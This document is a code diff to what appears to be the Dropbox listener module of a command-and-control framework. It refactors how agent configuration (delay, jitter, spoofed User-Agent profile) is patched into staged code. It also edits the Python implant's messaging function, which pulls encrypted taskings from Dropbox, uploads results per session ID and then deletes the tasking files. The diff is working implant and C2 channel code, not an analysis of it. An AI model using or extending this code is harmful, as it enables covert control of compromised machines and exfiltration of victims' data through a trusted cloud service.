@@ -548,13 +548,6 @@ class Listener:
             #strip out comments and blank lines
             code = helpers.strip_python_comments(code)
 
-            #patch some more
-            code = code.replace('delay = 60', 'delay = %s' % (delay))
-            code = code.replace('jitter = 0.0', 'jitter = %s' % (jitter))
-            code = code.replace('profile = "/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"', 'profile = "%s"' % (profile))
-            code = code.replace('lostLimit = 60', 'lostLimit = %s' % (lostLimit))
-            code = code.replace('defaultResponse = base64.b64decode("")', 'defaultResponse = base64.b64decode("%s")' % (b64DefaultResponse))
-
             # patch in the killDate and workingHours if they're specified
             if killDate != "":
                 code = code.replace('killDate = ""', 'killDate = "%s"' % (killDate))
@@ -576,9 +569,14 @@ class Listener:
         #we are generating code for an already deployed agent
         deployed = "deployed" in kwargs
 
+        delay = listenerOptions["DefaultDelay"]["Value"]
+        jitter = listenerOptions["DefaultJitter"]["Value"]
+        profile = listenerOptions["DefaultProfile"]["Value"]
+        lostLimit = listenerOptions["DefaultLostLimit"]["Value"]
         stagingKey = listenerOptions['StagingKey']['Value']
         pollInterval = listenerOptions['PollInterval']['Value']
         apiToken = listenerOptions['APIToken']['Value']
+        b64DefaultResponse = base64.b64encode(self.default_response())
         baseFolder = listenerOptions['BaseFolder']['Value'].strip('/')
         taskingsFolder = "/%s/%s" % (baseFolder, listenerOptions['TaskingsFolder']['Value'].strip('/'))
         resultsFolder = "/%s/%s" % (baseFolder, listenerOptions['ResultsFolder']['Value'].strip('/'))
@@ -712,14 +710,13 @@ class Listener:
             elif language.lower() == 'python':
 
                 sendMessage = """
-def send_message{name}(packets=None, **kwargs):
+def send_message_{name}(packets=None, **kwargs):
     # Requests a tasking or posts data to a randomized tasking URI.
     # If packets == None, the agent GETs a tasking from the control server.
     # If packets != None, the agent encrypts the passed packets and
     #    POSTs the data to the control server.
 
     headers = kwargs['headers']
-    taskURIs = kwargs['taskURIs'].split(',')
 
     def post_message(uri, data, headers):
         req = urllib2.Request(uri)
@@ -747,7 +744,7 @@ def send_message{name}(packets=None, **kwargs):
 
 
     with open("agentdata","a") as fh:
-        fh.write("sessionid: {}, resultsfolder {} and taskingFolder {}".format(sessionID,resultsFolder,taskingsFolder))
+        fh.write("sessionid: {{}}, resultsfolder {{}} and taskingFolder {{}}".format(sessionID,resultsFolder,taskingsFolder))
 
     if packets:
         data = ''.join(packets)
@@ -756,7 +753,7 @@ def send_message{name}(packets=None, **kwargs):
         data = build_routing_packet(stagingKey, sessionID, meta=5, encData=encData)
         #check to see if there are any results already present
 
-        headers['Dropbox-API-Arg'] = "{\\"path\\":\\"%s/%s.txt\\"}" % (resultsFolder, sessionID)
+        headers['Dropbox-API-Arg'] = "{{\\"path\\":\\"%s/%s.txt\\"}}" % (resultsFolder, sessionID)
 
         try:
             pkdata = post_message('https://content.dropboxapi.com/2/files/download', data=None, headers=headers)
@@ -769,7 +766,7 @@ def send_message{name}(packets=None, **kwargs):
         headers['Content-Type'] = "application/octet-stream"
         requestUri = 'https://content.dropboxapi.com/2/files/upload'
     else:
-        headers['Dropbox-API-Arg'] = "{\\"path\\":\\"%s/%s.txt\\"}" % (taskingsFolder, sessionID)
+        headers['Dropbox-API-Arg'] = "{{\\"path\\":\\"%s/%s.txt\\"}}" % (taskingsFolder, sessionID)
         requestUri='https://content.dropboxapi.com/2/files/download'
 
     try:
@@ -777,7 +774,7 @@ def send_message{name}(packets=None, **kwargs):
         if (resultdata and len(resultdata) > 0) and requestUri.endswith('download'):
             headers['Content-Type'] = "application/json"
             del headers['Dropbox-API-Arg']
-            datastring="{\\"path\\":\\"%s/%s.txt\\"}" % (taskingsFolder, sessionID)
+            datastring="{{\\"path\\":\\"%s/%s.txt\\"}}" % (taskingsFolder, sessionID)
             nothing = post_message('https://api.dropboxapi.com/2/files/delete', datastring, headers)
 
         return ('200', resultdata)
@@ -801,7 +798,6 @@ def send_message{name}(packets=None, **kwargs):
     'jitter' : {jitter},
     'fixed_parameters': {{
         'headers' : {{'User-Agent': "{UA}"}},
-        'taskURIs' : "{taskURIs}",
     }},
     'send_func': {send_func},
     'defaultResponse': "{defaultResponse}",
@@ -817,12 +813,9 @@ def send_message{name}(packets=None, **kwargs):
                             jitter = jitter,
                             UA = profile.split('|')[1],
                             name = listenerOptions['Name']['Value'],
-                            taskURIs = profile.split('|')[0],
                             lostLimit = lostLimit,
                             defaultResponse = b64DefaultResponse),
-                        sendMessage.format(name=listenerOptions['Name']['Value'],
-                            update_servers = updateServers,
-                            https = https_attrs))
+                        sendMessage)
 
         else:
             print helpers.color('[!] listeners/dbx generate_comms(): no language specified!')
